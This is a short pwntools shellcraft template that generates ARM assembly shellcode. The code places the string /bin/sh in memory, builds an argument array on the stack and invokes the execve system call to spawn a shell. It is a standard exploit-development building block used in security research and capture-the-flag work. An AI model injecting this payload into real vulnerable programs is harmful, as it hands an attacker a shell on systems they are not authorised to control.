<% from pwnlib.shellcraft import arm, common %>
<%docstring>Execute /bin/sh</%docstring>
<%
	bin_sh = common.label("bin_sh")
%>

	adr r0, ${bin_sh}
	mov r2, #0
	push {r0, r2}
	mov r1, sp
	svc SYS_execve

${bin_sh}:
	.asciz "/bin/sh"
